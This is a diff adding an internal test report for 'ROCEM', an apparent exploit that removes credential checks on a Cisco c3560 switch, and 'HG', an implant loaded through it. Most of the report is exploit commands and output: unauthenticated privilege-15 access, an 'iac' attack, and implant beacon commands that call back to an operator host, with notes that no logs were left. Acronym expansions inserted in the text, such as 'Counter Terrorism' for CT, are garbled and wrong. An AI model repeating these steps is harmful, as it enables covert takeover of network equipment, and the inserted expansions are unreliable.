@@ -1,0 +1,118 @@
+
+                        Owner: User #71467
+ROCEM v1.2-Adverse-1r Testing
+ROCEM v1.2 was delivered by Xetron on 9/15/2015 to address ROC-12 - EAREnterprise Archive 5471 - ROCEM set/unset does not work with flux.  ROCEM is part of the CONOPConcealed Operation for throwing HG on Adverse.  ROCEM was previously tested and delivered for Adverse.  Regression testing will include test of set/unset feature fixed, test of complete CONOPConcealed Operation for use with HG, test ROCEM interactive session, and ad-hoc tests.  This test will use the Test Setup documented for HG v3.1.3-Adverse-1h.
+Testing Summary
+ 
+Testing Notes
+
+Test set/unset feature of ROCEM
+DUT configured with target configuration and network setup
+DUT is accessed by hopping through three flux nodes as per the CONOP
+Reloaded DUTDevice Under Test to start with a clean device
+From Adverse ICON machine, set ROCEM:root@debian:/home/user1/ops/adverse/adverse-1r/rocem# ./rocem_c3560-ipbase-mz.122-35.SE5.py -s 192.168.0.254[+] Validating data/interactive.bin[+] Validating data/set.bin[+] Validating data/transfer.bin[+] Validating data/unset.bin
+****************************************Image: c3560-ipbase-mz.122-35.SE5Host: 192.168.0.254Action: Set****************************************
+Proceed? (y/n)y[*] Attempting connection to host 192.168.0.254:23[+] Connection established[*] Sending Protocol Step 1[*] Sending Protocol Step 2[+] Doneroot@debian:/home/user1/ops/adverse/adverse-1r/rocem#
+
+
+Verified I could telnet and rx priv 15 without creds:
+root@debian:/home/user1/ops/adverse/adverse-1r/rocem# telnet 192.168.0.254Trying 192.168.0.254...Connected to 192.168.0.254.Escape character is '^]'.
+MLS-Sth#
+MLS-Sth#show privCurrent privilege level is 15MLS-Sth#
+
+Unset ROCEMroot@debian:/home/user1/ops/adverse/adverse-1r/rocem# ./rocem_c3560-ipbase-mz.122-35.SE5.py -u 192.168.0.254[+] Validating data/interactive.bin[+] Validating data/set.bin[+] Validating data/transfer.bin[+] Validating data/unset.bin
+****************************************Image: c3560-ipbase-mz.122-35.SE5Host: 192.168.0.254Action: Unset****************************************
+Proceed? (y/n)y[*] Attempting connection to host 192.168.0.254:23[+] Connection established[*] Sending Protocol Step 1[*] Sending Protocol Step 2[+] Doneroot@debian:/home/user1/ops/adverse/adverse-1r/rocem#
+
+
+Verified I am now challenged for creds:
+root@debian:/home/user1/ops/adverse/adverse-1r/rocem# telnet 192.168.0.254Trying 192.168.0.254...Connected to 192.168.0.254.Escape character is '^]'.
+User Access Verification
+Password:
+
+
+
+Test of Using ROCEM to Load HG
+Set ROCEM on DUT
+Ran IACInternational Access Code attack - No logs seen on console or buffer, CPU spiked briefly to 32%:root@debian:/home/user1/ops/adverse/adverse-1h/attack/linux# ./iac --ip 192.168.0.254 --l test:test testLGEC -125DHEC -159M
+
+Unset ROCEM:root@debian:/home/user1/ops/adverse/adverse-1r/rocem# ./rocem_c3560-ipbase-mz.122-35.SE5.py -u 192.168.0.254[+] Validating data/interactive.bin[+] Validating data/set.bin[+] Validating data/transfer.bin[+] Validating data/unset.bin
+****************************************Image: c3560-ipbase-mz.122-35.SE5Host: 192.168.0.254Action: Unset****************************************
+Proceed? (y/n)y[*] Attempting connection to host 192.168.0.254:23[+] Connection established[*] Sending Protocol Step 1[*] Sending Protocol Step 2[+] Done
+
+Used remote to upload HG -  No logs seen on console or buffer, CPU 
+
+Did not get expected result code:
+----------------------------------------------------------------------------Sending sequence -->683<-- command is 40 bytes to procid 0x925e09eSending UDP/bounce from port 8184 to port 53----------------------------------------------------------------------------GOOD - status OK.OP: RUNCODE using Per Second Code address: 0x028a33b0 No data Result: 0xfffffffb
+
+When attempting to establish a CTCounter Terrorism session with implant, the UDPUser Datagram Protocol trigger packets are getting acknowledged however I do not get a call back.  Attempted to re-authenticate to proxy from seeds host and restart seeds traffic, no luck.
+Wireshark running on ICON VMVirtual Machine shows no attempt made by HG to call back, however I do see the trigger ack packets.
+Tried setting an explicit host to impersonate, and it does call back:[192.168.211.10]> capability show[Success]  Name Version  Baseline Unsupported  ACEApplication Control Engine (Module) 26 FilterBroker 22  IV 17  Tunnel 10  DnsCheckin 5  Scramble Unknown  Redirector Unknown  Collector Unknown  PassThrough Unknown  MITMMan-In-The-Middle attack Unknown ************ Success ************[capability show]
+[192.168.211.10]> aliases collect file module tunbeachhead communication filesystem packet verbositybeacon compression https process webca device ilm quit capability dns memory redir checkin ebroker mitm scramble cmd encryption mode socket
+[192.168.211.10]>
+
+HG does list Seeds host as a snooped https client and dns client.  Attempting CTCounter Terrorism Session again without explicit impersonation
+Now it is working - CTCounter Terrorism session successful.
+
+
+Repeat CONOPConcealed Operation - verify result code from remote after HG uploaded
+Uninstalled HG - device uninstall -mp -f
+Reloaded device to start with a clean device
+Set ROCEM
+IAC attack
+Unset ROCEM
+Upload HG with remote - got same unexpected result code - THIS WAS FOUND TO BE DUE TO INCORRECT BOOTLOADER VERSION FOR HG PERSISTENCE.  NOT RELATED TO ROCEM.GOOD - status OK.OP: RUNCODE using Per Second Code address: 0x0299ebdc No data Result: 0xfffffffb
+
+
+Attempted CTCounter Terrorism session - successful
+[192.168.0.50]> beacon set_current_trigger_seq_num 0[Success] Current trigger sequence number has been successfully set to 0************ Success ************[beacon set_current_trigger_seq_num 0]
+[192.168.0.50]> beacon call_base_back https 192.168.221.40 443[Success] Trigger Sequence Number sent: 0************ Success ************[beacon call_base_back https 192.168.221.40 443]
+[192.168.0.50]>
+Listening for clients on port 443...Accepted connection from 192.168.211.10:26377Attempting SSLSecure Socket Layer Handshake...SSL Handshake Successful![Success] New Key: lH93dGqZbCX*ZSqEXDRUxMX7U6k4qcaygQwICIo8RcE=************ Success ************[ilm listen adverse-1h.txt]
+[192.168.211.10]>
+
+Verified that the unexpected result code is received whether HG is loaded via ROCEM or just IACInternational Access Code alone with creds.  Either way, HG still seems to work.
+Created JIRAUser Managment Software (Atlassian) Issue for unexpected result code
+
+
+Test for Unexpted result code when ROCEM not used - Repeated test, but did not use ROCEM.  Instead supplied IACInternational Access Code with creds.  Still received unexpected result code.  Does not appear to be an issue with ROCEM.
+
+Repeated set/unset commands - 10
+Uninstalled HG and reloaded to start with a clean device
+Performed 10 iterations of ROCEM set, establish a telnet session without creds, ROCEM unset, establsih that creds are now required.
+No messages on console or syslog
+
+
+ROCEM interactive session
+Establish ROCEM interactive session
+Session established and I see a vty in use with no user in output of show users as expected:MLS-Sth#show user Line User Host(s) Idle Location* 1 vty 0 idle 00:00:00 192.168.221.40
+Interface User Mode Idle Peer Address
+MLS-Sth#
+
+Issued show commands to survey device
+Verified after I excited interactive session that creds are now required
+Repeated 10 interactive sessions - successful
+Established a telnet session to switch while interactive session was active - was prompted for creds as expected
+No logs observed on switch, no spike observed except when show tech was executed as part of survey commands, at which time 5 sec CPU spiked to 29%.
+
+
+Ad-hoc - issue multple set commands in a row
+Started IXIA background traffic - 50M in each direction
+Issued 10 set commands in a row - no error messages reported, switch was set
+Issued one unset command and verified via telnet that switch was unset
+Issued 10 unset commands - no error message, verified by telnet that switch was unset
+Set the switch and then logged via telnet as ROCEM user
+Issued additional set commands in another window - no errors reported
+
+
+
+ 
+ 
+ 
+
+Previous versions:
+| 1 empty
+| 2 [Xetron]
+| 3 [Xetron]
+|
+                    
